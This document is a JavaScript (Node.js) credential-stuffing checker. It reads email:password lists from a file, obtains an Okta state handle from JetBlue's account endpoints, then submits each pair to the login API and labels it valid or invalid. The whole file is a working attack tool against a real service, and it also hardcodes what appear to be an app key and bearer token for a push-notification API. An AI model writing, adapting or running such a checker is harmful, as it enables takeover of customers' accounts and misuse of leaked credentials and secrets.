const fs = require('fs');
const axios = require('axios');

async function processFile(filename) {
    try {
        const data = fs.readFileSync(filename, 'utf8');
        const lines = data.split('\n');

        for (const line of lines) {
            const [email, password] = line.split(':');

            if (email && password) {
                await makePostRequest(email.trim(), password.trim());
            }
        }
    } catch (err) {
        console.error('Error reading file:', err);
    }
}
async function getLastStateValue() {
    try {
      const deviceApiResponse = await axios.get("https://device-api.urbanairship.com/api/auth/device", {
        
        headers: {
          "Host": "device-api.urbanairship.com",
          "Accept": "application/vnd.urbanairship+json; version=3;",
          "X-UA-Channel-ID": "f5aa9717-5593-4c20-9d2e-097f5f92761a",
          "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
          "Connection": "keep-alive",
          "ADRUM": "isAjax:true",
          "X-UA-App-Key": "D3zolWuLRnOlw9pTpe8nnA",
          "User-Agent": "(UALib 16.12.4; D3zolWuLRnOlw9pTpe8nnA)",
          "Authorization": "Bearer rXMW608szmCWxJ0r29nzv7fq6kr7M7soDr8AfznUn7M=",
          "Accept-Encoding": "gzip;q=1.0, compress;q=0.5",
          "ADRUM_1": "isMobile:true"
        }
      });
  
  
      const authResponse = await axios.post("https://accounts.jetblue.com/oauth2/aus63a5bs52M8z9aE2p7/v1/interact", "client_id=0oa6pzxuedDQ3TsPs2p7&code_challenge=xu3o11BBRqUNj0vSF2M3oIchzcmDyxBsOtz_VpHNTPE&code_challenge_method=S256&redirect_uri=http:%2F%2Flocalhost:8080%2Fauthorization-code%2Fcallback&scope=openid+profile+offline_access+email&state=182CE7AD-5476-4A01-88A1-FF0FDE24EE45", {
        headers: {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
          "Pragma": "no-cache",
          "Accept": "*/*",
          "Content-Type": "application/x-www-form-urlencoded"
        }
      });
  
      const interactionHandle = authResponse.data.interaction_handle;
  
      const introspectResponse = await axios.post("https://accounts.jetblue.com/idp/idx/introspect", { "interactionHandle": interactionHandle }, {
        headers: {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
          "Pragma": "no-cache",
          "Accept": "*/*",
          "Content-Type": "application/json"
        }
      });
  
      const stateHandle = introspectResponse.data.stateHandle;
  
      return stateHandle;
    } catch (error) {
      console.error('Error:', error);
      throw error;
    }
  }
async function makePostRequest(email, password) {
    const stateHandle = await getLastStateValue(); 
    const requestBody = {
        identifier: email,
        credentials: { passcode: password },
        stateHandle: stateHandle
    };

    const config = {
        headers: {
            'accept': 'application/json; okta-version=1.0.0',
            'accept-language': 'en',
            'content-type': 'application/json',
            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'x-okta-user-agent-extended': 'okta-auth-js/7.0.2 okta-signin-widget-7.14.1',
            'x-okta-username': email
        },
        referrer: 'https://www.jetblue.com/',
        referrerPolicy: 'strict-origin-when-cross-origin',
        method: 'POST',
        mode: 'cors',
        credentials: 'omit',
        data: JSON.stringify(requestBody)
    };

    try {
        const response = await axios('https://accounts.jetblue.com/idp/idx/identify', config);
        if (response.status === 200) {
            console.log(`${email} > \x1b[32mValid\x1b[0m`);
        } else {
            console.log(`${email} > \x1b[31mNot Valid\x1b[0m`);
        }
    } catch (error) {
        if (error.response && error.response.status === 401) {
            console.log(`${email} > \x1b[31mNot Valid\x1b[0m`);
        } else {
            console.error(`Error for ${email}:`, error.message);
        }
    }
}

const filename = 'emails.txt';
processFile(filename);
